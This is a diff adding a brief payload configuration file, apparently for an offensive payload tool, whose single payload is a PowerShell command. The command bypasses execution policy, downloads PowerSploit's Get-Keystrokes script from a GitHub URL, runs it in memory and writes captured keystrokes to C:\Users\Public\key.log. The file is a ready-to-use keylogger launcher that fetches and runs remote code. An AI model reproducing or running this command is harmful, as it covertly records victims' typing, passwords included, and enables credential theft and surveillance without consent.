@@ -1,0 +1,7 @@
+[Info]
+Author      = Karim shoair (D4Vinci)
+Description = Using a script from powersploit to log keyboard strokes to C:\Users\Public\key.log
+
+[Payload]
+Type     = Other
+Payload  = Powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1');Get-Keystrokes -LogPath C:\Users\Public\key.log
